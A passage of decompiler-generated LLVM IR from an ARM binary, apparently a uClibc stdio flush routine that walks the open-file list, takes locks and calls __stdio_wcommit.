  store i32 %v1_ffa4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ffb8

dec_label_pc_ffb8:                                ; preds = %dec_label_pc_ff30, %dec_label_pc_ffa0, %dec_label_pc_ff98
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_ffbc = load i32, i32* @r6, align 4
  %v2_ffbc = add i32 %v0_ffbc, 160
  %v3_ffbc = inttoptr i32 %v2_ffbc to i32*
  %v4_ffbc = load i32, i32* %v3_ffbc, align 4
  store i32 %v4_ffbc, i32* %r5.global-to-local, align 4
  %v1_ffc0 = add i32 %v4_ffbc, 8
  %v2_ffc0 = inttoptr i32 %v1_ffc0 to i32*
  %v3_ffc0 = load i32, i32* %v2_ffc0, align 4
  store i32 %v3_ffc0, i32* %r3.global-to-local, align 4
  %v1_ffc4 = load i32, i32* %r8.global-to-local, align 4
  %v3_ffc4 = icmp uge i32 %v3_ffc0, %v1_ffc4
  store i1 %v3_ffc4, i1* %cpsr_c.global-to-local, align 1
  %v9_ffc4 = icmp eq i32 %v3_ffc0, %v1_ffc4
  br i1 %v9_ffc4, label %dec_label_pc_1000c, label %dec_label_pc_ffcc

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ffb8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_ffbc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_ffd8123 = inttoptr i32 %v4_ffbc to i32*
  %v2_ffd8124 = load i32, i32* %v1_ffd8123, align 4
  store i32 %v2_ffd8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_ffdc126 = icmp eq i32 %v2_ffd8124, 0
  br i1 %v9_ffdc126, label %dec_label_pc_ffe4, label %dec_label_pc_fffc

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffcc, %dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge
  %v0_ffe4127 = phi i32 [ %v1_ffdc.pre, %dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge ], [ 0, %dec_label_pc_ffcc ]
  store i32 %v0_ffe4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fff4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fff4, label %dec_label_pc_fff8, label %dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge

dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge:    ; preds = %dec_label_pc_ffe4
  %v0_ffd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ffdc.pre = load i32, i32* @r4, align 4
  %v1_ffd8 = inttoptr i32 %v0_ffd8.pre to i32*
  %v2_ffd8 = load i32, i32* %v1_ffd8, align 4
  store i32 %v2_ffd8, i32* %r3.global-to-local, align 4
  %v3_ffdc = icmp uge i32 %v2_ffd8, %v1_ffdc.pre
  store i1 %v3_ffdc, i1* %cpsr_c.global-to-local, align 1
  %v9_ffdc = icmp eq i32 %v2_ffd8, %v1_ffdc.pre
  br i1 %v9_ffdc, label %dec_label_pc_ffe4, label %dec_label_pc_fffc

dec_label_pc_fff8:                                ; preds = %dec_label_pc_ffe4
  %v0_fff8 = load i32, i32* @r4, align 4
  store i32 %v0_fff8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fffc

dec_label_pc_fffc:                                ; preds = %dec_label_pc_ffcc, %dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge, %dec_label_pc_fff8
  %v0_fffc = phi i32 [ %v0_fff8, %dec_label_pc_fff8 ], [ %v2_ffd8124, %dec_label_pc_ffcc ], [ %v2_ffd8, %dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge ]
  %v1_fffc = phi i32 [ %v0_fff8, %dec_label_pc_fff8 ], [ 0, %dec_label_pc_ffcc ], [ %v1_ffdc.pre, %dec_label_pc_ffe4.dec_label_pc_ffd8_crit_edge ]
  %v3_fffc = icmp uge i32 %v0_fffc, %v1_fffc
  store i1 %v3_fffc, i1* %cpsr_c.global-to-local, align 1
  %v9_fffc = icmp eq i32 %v0_fffc, %v1_fffc
  br i1 %v9_fffc, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_fffc
  %v1_10000 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10000, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_fffc, %bb67
  %v1_10004 = xor i1 %v9_fffc, true
  call void @__pseudo_cond_branch(i1 %v1_10004, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_10008 = load i32, i32* %r8.global-to-local, align 4
  %v1_10008 = load i32, i32* %r5.global-to-local, align 4
  %v2_10008 = add i32 %v1_10008, 8
  %v3_10008 = inttoptr i32 %v2_10008 to i32*
  store i32 %v0_10008, i32* %v3_10008, align 4
  %v0_10010.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1000c

dec_label_pc_1000c:                               ; preds = %dec_label_pc_ffb8, %bb68
  %v0_1001c = phi i32 [ %v0_ffbc, %dec_label_pc_ffb8 ], [ %v0_10010.pre, %bb68 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_10010 = add i32 %v0_1001c, 160
  %v3_10010 = inttoptr i32 %v2_10010 to i32*
  %v4_10010 = load i32, i32* %v3_10010, align 4
  store i32 %v4_10010, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v1_10018 = add i32 %v4_10010, 4
  %v2_10018 = inttoptr i32 %v1_10018 to i32*
  %v3_10018 = load i32, i32* %v2_10018, align 4
  store i32 %v3_10018, i32* %r1.global-to-local, align 4
  %v2_1001c = add i32 %v0_1001c, 84
  %v3_1001c = inttoptr i32 %v2_1001c to i32*
  %v4_1001c = load i32, i32* %v3_1001c, align 4
  store i32 %v4_1001c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10020 = icmp eq i32 %v3_10018, 0
  %v1_10024 = inttoptr i32 %v4_1001c to i32*
  %v2_10024 = load i32, i32* %v1_10024, align 4
  store i32 %v2_10024, i32* @r5, align 4
  br i1 %v2_10020, label %dec_label_pc_1002c, label %dec_label_pc_1008c

dec_label_pc_1002c:                               ; preds = %dec_label_pc_1000c
  %v2_1002c = add i32 %v4_10010, 8
  %v3_1002c = inttoptr i32 %v2_1002c to i32*
  store i32 0, i32* %v3_1002c, align 4
  %v0_10030 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10030, i32* @r7, align 4
  br label %dec_label_pc_10034

dec_label_pc_10034:                               ; preds = %dec_label_pc_10064.dec_label_pc_10034_crit_edge, %dec_label_pc_1002c
  %v0_10034 = phi i32 [ %v0_10034.pre, %dec_label_pc_10064.dec_label_pc_10034_crit_edge ], [ %v0_10030, %dec_label_pc_1002c ]
  %v1_10034 = inttoptr i32 %v0_10034 to i32*
  %v2_10034 = load i32, i32* %v1_10034, align 4
  store i32 %v2_10034, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10034, i32* %r2.global-to-local, align 4
  %v2_10040111 = load i32, i32* %v1_10034, align 4
  store i32 %v2_10040111, i32* %r3.global-to-local, align 4
  %v3_10044113 = icmp uge i32 %v2_10040111, %v2_10034
  store i1 %v3_10044113, i1* %cpsr_c.global-to-local, align 1
  %v9_10044119 = icmp eq i32 %v2_10040111, %v2_10034
  br i1 %v9_10044119, label %dec_label_pc_1004c, label %dec_label_pc_10064

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10034, %dec_label_pc_1004c.dec_label_pc_10040_crit_edge
  %v0_1004c120 = phi i32 [ %v1_10044.pre, %dec_label_pc_1004c.dec_label_pc_10040_crit_edge ], [ %v2_10034, %dec_label_pc_10034 ]
  store i32 %v0_1004c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1005c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1005c, label %dec_label_pc_10060, label %dec_label_pc_1004c.dec_label_pc_10040_crit_edge

dec_label_pc_1004c.dec_label_pc_10040_crit_edge:  ; preds = %dec_label_pc_1004c
  %v0_10040.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10044.pre = load i32, i32* @r4, align 4
  %v1_10040 = inttoptr i32 %v0_10040.pre to i32*
  %v2_10040 = load i32, i32* %v1_10040, align 4
  store i32 %v2_10040, i32* %r3.global-to-local, align 4
  %v3_10044 = icmp uge i32 %v2_10040, %v1_10044.pre
  store i1 %v3_10044, i1* %cpsr_c.global-to-local, align 1
  %v9_10044 = icmp eq i32 %v2_10040, %v1_10044.pre
  br i1 %v9_10044, label %dec_label_pc_1004c, label %dec_label_pc_10064

dec_label_pc_10060:                               ; preds = %dec_label_pc_1004c
  %v0_10060 = load i32, i32* @r4, align 4
  store i32 %v0_10060, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10064

dec_label_pc_10064:                               ; preds = %dec_label_pc_10034, %dec_label_pc_1004c.dec_label_pc_10040_crit_edge, %dec_label_pc_10060
  %v0_1006c = phi i32 [ %v0_10060, %dec_label_pc_10060 ], [ %v2_10040111, %dec_label_pc_10034 ], [ %v2_10040, %dec_label_pc_1004c.dec_label_pc_10040_crit_edge ]
  %v1_10064 = phi i32 [ %v0_10060, %dec_label_pc_10060 ], [ %v2_10034, %dec_label_pc_10034 ], [ %v1_10044.pre, %dec_label_pc_1004c.dec_label_pc_10040_crit_edge ]
  %v3_10064 = icmp uge i32 %v0_1006c, %v1_10064
  store i1 %v3_10064, i1* %cpsr_c.global-to-local, align 1
  %v9_10064 = icmp eq i32 %v0_1006c, %v1_10064
  br i1 %v9_10064, label %dec_label_pc_1006c, label %dec_label_pc_10064.dec_label_pc_10034_crit_edge

dec_label_pc_10064.dec_label_pc_10034_crit_edge:  ; preds = %dec_label_pc_10064
  %v0_10034.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10034

dec_label_pc_1006c:                               ; preds = %dec_label_pc_10064
  %v2_1006c = icmp ne i32 %v1_10064, 0
  store i1 %v2_1006c, i1* %cpsr_c.global-to-local, align 1
  %v7_10070 = icmp slt i32 %v1_10064, 2
  br i1 %v7_10070, label %dec_label_pc_1008cthread-pre-split, label %dec_label_pc_10074

dec_label_pc_10074:                               ; preds = %dec_label_pc_1006c
  %v0_10074 = load i32, i32* @r7, align 4
  store i32 %v0_10074, i32* %r0.global-to-local, align 4
  %v0_10078 = load i32, i32* %r1.global-to-local, align 4
  %v1_10078 = add i32 %v0_10078, 129
  store i32 %v1_10078, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1008cthread-pre-split

dec_label_pc_1008cthread-pre-split:               ; preds = %dec_label_pc_1006c, %dec_label_pc_10074
  %v0_101d8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_1008cthread-pre-split, %dec_label_pc_1000c
  %v0_101d8.pr = phi i32 [ %v0_101d8.pr.pr, %dec_label_pc_1008cthread-pre-split ], [ %v2_10024, %dec_label_pc_1000c ]
  store i32 100, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101d818 = icmp eq i32 %v0_101d8.pr, 0
  br i1 %v2_101d818, label %dec_label_pc_101e0, label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %dec_label_pc_1008c, %dec_label_pc_101d4
  %v0_100c4 = phi i32 [ %v3_101d4, %dec_label_pc_101d4 ], [ %v0_101d8.pr, %dec_label_pc_1008c ]
  %v1_1009c = inttoptr i32 %v0_100c4 to i16*
  %v2_1009c = load i16, i16* %v1_1009c, align 2
  %v3_1009c = zext i16 %v2_1009c to i32
  store i32 %v3_1009c, i32* %r3.global-to-local, align 4
  %v1_100a0 = and i32 %v3_1009c, 64
  %v2_100a0 = icmp eq i32 %v1_100a0, 0
  br i1 %v2_100a0, label %dec_label_pc_101d4, label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %dec_label_pc_1009c
  %v0_100a8 = load i32, i32* @r6, align 4
  %v1_100a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_100a8 = add i32 %v1_100a8, %v0_100a8
  %v3_100a8 = inttoptr i32 %v2_100a8 to i32*
  %v4_100a8 = load i32, i32* %v3_100a8, align 4
  store i32 %v4_100a8, i32* %r3.global-to-local, align 4
  %v1_100ac = inttoptr i32 %v4_100a8 to i32*
  %v2_100ac = load i32, i32* %v1_100ac, align 4
  store i32 %v2_100ac, i32* %r3.global-to-local, align 4
  %v2_100b0 = icmp ugt i32 %v2_100ac, 1
  store i1 %v2_100b0, i1* %cpsr_c.global-to-local, align 1
  %v7_100b0 = icmp eq i32 %v2_100ac, 2
  br i1 %v7_100b0, label %dec_label_pc_10114, label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %dec_label_pc_100a8
  %v1_100b8 = add i32 %v0_100c4, 64
  %v2_100b8 = inttoptr i32 %v1_100b8 to i32*
  %v3_100b8 = load i32, i32* %v2_100b8, align 4
  store i32 %v3_100b8, i32* %r3.global-to-local, align 4
  %v1_100bc = load i32, i32* %r8.global-to-local, align 4
  %v3_100bc = icmp uge i32 %v3_100b8, %v1_100bc
  store i1 %v3_100bc, i1* %cpsr_c.global-to-local, align 1
  %v9_100bc = icmp eq i32 %v3_100b8, %v1_100bc
  br i1 %v9_100bc, label %dec_label_pc_10108, label %dec_label_pc_100c4

dec_label_pc_100c4:                               ; preds = %dec_label_pc_100b8
  %v1_100c4 = add i32 %v0_100c4, 56
  store i32 %v1_100c4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_100c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_100d486 = inttoptr i32 %v1_100c4 to i32*
  %v2_100d487 = load i32, i32* %v1_100d486, align 4
  store i32 %v2_100d487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_100d894 = icmp eq i32 %v2_100d487, 0
  br i1 %v9_100d894, label %dec_label_pc_100e0, label %dec_label_pc_100f8

dec_label_pc_100e0:                               ; preds = %dec_label_pc_100c4, %dec_label_pc_100e0.dec_label_pc_100d4_crit_edge
  %v0_100e095 = phi i32 [ %v1_100d8.pre, %dec_label_pc_100e0.dec_label_pc_100d4_crit_edge ], [ 0, %dec_label_pc_100c4 ]
  store i32 %v0_100e095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_100f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_100f0, label %dec_label_pc_100f4, label %dec_label_pc_100e0.dec_label_pc_100d4_crit_edge

dec_label_pc_100e0.dec_label_pc_100d4_crit_edge:  ; preds = %dec_label_pc_100e0
  %v0_100d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_100d8.pre = load i32, i32* @r4, align 4
  %v1_100d4 = inttoptr i32 %v0_100d4.pre to i32*
  %v2_100d4 = load i32, i32* %v1_100d4, align 4
  store i32 %v2_100d4, i32* %r3.global-to-local, align 4
  %v3_100d8 = icmp uge i32 %v2_100d4, %v1_100d8.pre
  store i1 %v3_100d8, i1* %cpsr_c.global-to-local, align 1
  %v9_100d8 = icmp eq i32 %v2_100d4, %v1_100d8.pre
  br i1 %v9_100d8, label %dec_label_pc_100e0, label %dec_label_pc_100f8

dec_label_pc_100f4:                               ; preds = %dec_label_pc_100e0
  %v0_100f4 = load i32, i32* @r4, align 4
  store i32 %v0_100f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100f8

dec_label_pc_100f8:                               ; preds = %dec_label_pc_100c4, %dec_label_pc_100e0.dec_label_pc_100d4_crit_edge, %dec_label_pc_100f4
  %v0_100f8 = phi i32 [ %v0_100f4, %dec_label_pc_100f4 ], [ %v2_100d487, %dec_label_pc_100c4 ], [ %v2_100d4, %dec_label_pc_100e0.dec_label_pc_100d4_crit_edge ]
  %v1_100f8 = phi i32 [ %v0_100f4, %dec_label_pc_100f4 ], [ 0, %dec_label_pc_100c4 ], [ %v1_100d8.pre, %dec_label_pc_100e0.dec_label_pc_100d4_crit_edge ]
  %v3_100f8 = icmp uge i32 %v0_100f8, %v1_100f8
  store i1 %v3_100f8, i1* %cpsr_c.global-to-local, align 1
  %v9_100f8 = icmp eq i32 %v0_100f8, %v1_100f8
  br i1 %v9_100f8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_100f8
  %v1_100fc = load i32, i32* @r7, align 4
  store i32 %v1_100fc, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_100f8, %bb69
  %v1_10100 = xor i1 %v9_100f8, true
  call void @__pseudo_cond_branch(i1 %v1_10100, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_10104 = load i32, i32* %r8.global-to-local, align 4
  %v1_10104 = load i32, i32* @r5, align 4
  %v2_10104 = add i32 %v1_10104, 64
  %v3_10104 = inttoptr i32 %v2_10104 to i32*
  store i32 %v0_10104, i32* %v3_10104, align 4
  %v0_10108.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10108

dec_label_pc_10108:                               ; preds = %dec_label_pc_100b8, %bb70
  %v0_10108 = phi i32 [ %v0_100c4, %dec_label_pc_100b8 ], [ %v0_10108.pre, %bb70 ]
  %v1_10108 = add i32 %v0_10108, 60
  %v2_10108 = inttoptr i32 %v1_10108 to i32*
  %v3_10108 = load i32, i32* %v2_10108, align 4
  %v1_1010c = add i32 %v3_10108, 1
  store i32 %v1_1010c, i32* %r3.global-to-local, align 4
  store i32 %v1_1010c, i32* %v2_10108, align 4
  %v0_10114.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10114

dec_label_pc_10114:                               ; preds = %dec_label_pc_100a8, %dec_label_pc_10108
  %v0_1012c = phi i32 [ %v0_100c4, %dec_label_pc_100a8 ], [ %v0_10114.pre, %dec_label_pc_10108 ]
  %v1_10114 = inttoptr i32 %v0_1012c to i16*
  %v2_10114 = load i16, i16* %v1_10114, align 2
  %v3_10114 = zext i16 %v2_10114 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1011c = or i32 %v3_10114, %stack_var_-44.1
  %v1_10120 = xor i32 %v2_1011c, 320
  store i32 %v1_10120, i32* %r3.global-to-local, align 4
  %v1_10124 = and i32 %v1_10120, 832
  %v2_10124 = icmp eq i32 %v1_10124, 0
  br i1 %v2_10124, label %dec_label_pc_1012c, label %bb71

dec_label_pc_1012c:                               ; preds = %dec_label_pc_10114
  store i32 %v0_1012c, i32* @r0, align 4
  %v0_10130 = call i32 @__stdio_wcommit()
  store i32 %v0_10130, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10134 = icmp eq i32 %v0_10130, 0
  br i1 %v2_10134, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1012c
  %v1_10138 = load i32, i32* @r5, align 4
  %v2_10138 = inttoptr i32 %v1_10138 to i16*
  %v3_10138 = load i16, i16* %v2_10138, align 2
  %v4_10138 = zext i16 %v3_10138 to i32
  store i32 %v4_10138, i32* %r3.global-to-local, align 4
  %v2_1013c = add i32 %v1_10138, 8
  %v3_1013c = inttoptr i32 %v2_1013c to i32*
  %v4_1013c = load i32, i32* %v3_1013c, align 4
  store i32 %v4_1013c, i32* %r2.global-to-local, align 4
  %v2_10140 = and i32 %v4_10138, 65471
  store i32 %v2_10140, i32* %r3.global-to-local, align 4
  %v3_10144 = add i32 %v1_10138, 28
  %v4_10144 = inttoptr i32 %v3_10144 to i32*
  store i32 %v4_1013c, i32* %v4_10144, align 4
  %v1_10148 = load i32, i32* %r3.global-to-local, align 4
  %v2_10148 = trunc i32 %v1_10148 to i16
  %v3_10148 = load i32, i32* @r5, align 4
  %v4_10148 = inttoptr i32 %v3_10148 to i16*
  store i16 %v2_10148, i16* %v4_10148, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1012c
  %v1_1014c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1014c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_10114, %.thread7
  %v0_10150 = load i32, i32* @r6, align 4
  %v1_10150 = load i32, i32* %sb.global-to-local, align 4
  %v2_10150 = add i32 %v1_10150, %v0_10150
  %v3_10150 = inttoptr i32 %v2_10150 to i32*
  %v4_10150 = load i32, i32* %v3_10150, align 4
  store i32 %v4_10150, i32* %r3.global-to-local, align 4
  %v1_10154 = inttoptr i32 %v4_10150 to i32*
  %v2_10154 = load i32, i32* %v1_10154, align 4
  store i32 %v2_10154, i32* %r3.global-to-local, align 4
  %v2_10158 = icmp ugt i32 %v2_10154, 1
  store i1 %v2_10158, i1* %cpsr_c.global-to-local, align 1
  %v7_10158 = icmp eq i32 %v2_10154, 2
  br i1 %v7_10158, label %dec_label_pc_101d4, label %dec_label_pc_10160

dec_label_pc_10160:                               ; preds = %bb71
  %v0_10160 = load i32, i32* @r5, align 4
  %v1_10160 = add i32 %v0_10160, 60
  %v2_10160 = inttoptr i32 %v1_10160 to i32*
  %v3_10160 = load i32, i32* %v2_10160, align 4
  %v1_10164 = add i32 %v3_10160, -1
  store i32 %v1_10164, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10168 = icmp eq i32 %v1_10164, 0
  store i32 %v1_10164, i32* %v2_10160, align 4
  br i1 %v2_10168, label %dec_label_pc_10174, label %dec_label_pc_101d4

dec_label_pc_10174:                               ; preds = %dec_label_pc_10160
  %v0_10174 = load i32, i32* %r3.global-to-local, align 4
  %v1_10174 = load i32, i32* @r5, align 4
  %v2_10174 = add i32 %v1_10174, 64
  %v3_10174 = inttoptr i32 %v2_10174 to i32*
  store i32 %v0_10174, i32* %v3_10174, align 4
  %v0_10178 = load i32, i32* @r5, align 4
  %v1_10178 = add i32 %v0_10178, 56
  store i32 %v1_10178, i32* @r7, align 4
  br label %dec_label_pc_1017c

dec_label_pc_1017c:                               ; preds = %dec_label_pc_101ac.dec_label_pc_1017c_crit_edge, %dec_label_pc_10174
  %v0_10184 = phi i32 [ %v0_10184.pre, %dec_label_pc_101ac.dec_label_pc_1017c_crit_edge ], [ %v1_10178, %dec_label_pc_10174 ]
  %v0_1017c = phi i32 [ %v0_1017c.pre, %dec_label_pc_101ac.dec_label_pc_1017c_crit_edge ], [ %v0_10178, %dec_label_pc_10174 ]
  %v1_1017c = add i32 %v0_1017c, 56
  %v2_1017c = inttoptr i32 %v1_1017c to i32*
  %v3_1017c = load i32, i32* %v2_1017c, align 4
  store i32 %v3_1017c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10184, i32* %r2.global-to-local, align 4
  %v1_1018897 = inttoptr i32 %v0_10184 to i32*
  %v2_1018898 = load i32, i32* %v1_1018897, align 4
  store i32 %v2_1018898, i32* %r3.global-to-local, align 4
  %v3_1018c100 = icmp uge i32 %v2_1018898, %v3_1017c
  store i1 %v3_1018c100, i1* %cpsr_c.global-to-local, align 1
  %v9_1018c106 = icmp eq i32 %v2_1018898, %v3_1017c
  br i1 %v9_1018c106, label %dec_label_pc_10194, label %dec_label_pc_101ac

dec_label_pc_10194:                               ; preds = %dec_label_pc_1017c, %dec_label_pc_10194.dec_label_pc_10188_crit_edge
  %v0_10194107 = phi i32 [ %v1_1018c.pre, %dec_label_pc_10194.dec_label_pc_10188_crit_edge ], [ %v3_1017c, %dec_label_pc_1017c ]
  store i32 %v0_10194107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_101a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_101a4, label %dec_label_pc_101a8, label %dec_label_pc_10194.dec_label_pc_10188_crit_edge

dec_label_pc_10194.dec_label_pc_10188_crit_edge:  ; preds = %dec_label_pc_10194
  %v0_10188.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1018c.pre = load i32, i32* @r4, align 4
  %v1_10188 = inttoptr i32 %v0_10188.pre to i32*
  %v2_10188 = load i32, i32* %v1_10188, align 4
  store i32 %v2_10188, i32* %r3.global-to-local, align 4
  %v3_1018c = icmp uge i32 %v2_10188, %v1_1018c.pre
  store i1 %v3_1018c, i1* %cpsr_c.global-to-local, align 1
  %v9_1018c = icmp eq i32 %v2_10188, %v1_1018c.pre
  br i1 %v9_1018c, label %dec_label_pc_10194, label %dec_label_pc_101ac

dec_label_pc_101a8:                               ; preds = %dec_label_pc_10194
  %v0_101a8 = load i32, i32* @r4, align 4
  store i32 %v0_101a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_101ac

dec_label_pc_101ac:                               ; preds = %dec_label_pc_1017c, %dec_label_pc_10194.dec_label_pc_10188_crit_edge, %dec_label_pc_101a8
  %v0_101b4 = phi i32 [ %v0_101a8, %dec_label_pc_101a8 ], [ %v2_1018898, %dec_label_pc_1017c ], [ %v2_10188, %dec_label_pc_10194.dec_label_pc_10188_crit_edge ]
  %v1_101ac = phi i32 [ %v0_101a8, %dec_label_pc_101a8 ], [ %v3_1017c, %dec_label_pc_1017c ], [ %v1_1018c.pre, %dec_label_pc_10194.dec_label_pc_10188_crit_edge ]
  %v3_101ac = icmp uge i32 %v0_101b4, %v1_101ac
  store i1 %v3_101ac, i1* %cpsr_c.global-to-local, align 1
  %v9_101ac = icmp eq i32 %v0_101b4, %v1_101ac
  br i1 %v9_101ac, label %dec_label_pc_101b4, label %dec_label_pc_101ac.dec_label_pc_1017c_crit_edge

dec_label_pc_101ac.dec_label_pc_1017c_crit_edge:  ; preds = %dec_label_pc_101ac
  %v0_1017c.pre = load i32, i32* @r5, align 4
  %v0_10184.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1017c

dec_label_pc_101b4:                               ; preds = %dec_label_pc_101ac
  %v2_101b4 = icmp ne i32 %v1_101ac, 0
  store i1 %v2_101b4, i1* %cpsr_c.global-to-local, align 1
  %v7_101b8 = icmp slt i32 %v1_101ac, 2
  br i1 %v7_101b8, label %dec_label_pc_101d4, label %dec_label_pc_101bc

dec_label_pc_101bc:                               ; preds = %dec_label_pc_101b4
  %v0_101bc = load i32, i32* @r5, align 4
  %v1_101bc = add i32 %v0_101bc, 56
  store i32 %v1_101bc, i32* %r0.global-to-local, align 4
  %v0_101c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_101c0 = add i32 %v0_101c0, 129
  store i32 %v1_101c0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_101d4

dec_label_pc_101d4:                               ; preds = %dec_label_pc_10160, %dec_label_pc_101bc, %dec_label_pc_101b4, %bb71, %dec_label_pc_1009c
  %v0_101d4 = load i32, i32* @r5, align 4
  %v1_101d4 = add i32 %v0_101d4, 32
  %v2_101d4 = inttoptr i32 %v1_101d4 to i32*
  %v3_101d4 = load i32, i32* %v2_101d4, align 4
  store i32 %v3_101d4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101d8 = icmp eq i32 %v3_101d4, 0
  br i1 %v2_101d8, label %dec_label_pc_101e0, label %dec_label_pc_1009c

dec_label_pc_101e0:                               ; preds = %dec_label_pc_101d4, %dec_label_pc_1008c
  %v0_101e0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_101e0, i32* %r0.global-to-local, align 4
  %v0_1021c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_101e8:                               ; preds = %dec_label_pc_fec4
  %v3_101e8 = load i16, i16* %arg1, align 2
  %v4_101e8 = zext i16 %v3_101e8 to i32
  %v1_101ec = and i32 %v4_101e8, 64
  store i32 %v1_101ec, i32* %r3.global-to-local, align 4
  %v2_101ec = icmp eq i32 %v1_101ec, 0
  br i1 %v2_101ec, label %bb72, label %dec_label_pc_101f8

bb72:                                             ; preds = %dec_label_pc_101e8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101e8
  %v0_101f8 = call i32 @__stdio_wcommit()
  store i32 %v0_101f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101fc = icmp eq i32 %v0_101f8, 0
  br i1 %v2_101fc, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_101f8
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_101f8
  %v1_10200 = load i32, i32* @r4, align 4
  %v2_10200 = inttoptr i32 %v1_10200 to i16*
  %v3_10200 = load i16, i16* %v2_10200, align 2
  %v4_10200 = zext i16 %v3_10200 to i32
  store i32 %v4_10200, i32* %r3.global-to-local, align 4
  %v2_10204 = add i32 %v1_10200, 8
  %v3_10204 = inttoptr i32 %v2_10204 to i32*
  %v4_10204 = load i32, i32* %v3_10204, align 4
  store i32 %v4_10204, i32* %r2.global-to-local, align 4
  %v2_10208 = and i32 %v4_10200, 65471
  store i32 %v2_10208, i32* %r3.global-to-local, align 4
  %v2_1020c = trunc i32 %v2_10208 to i16
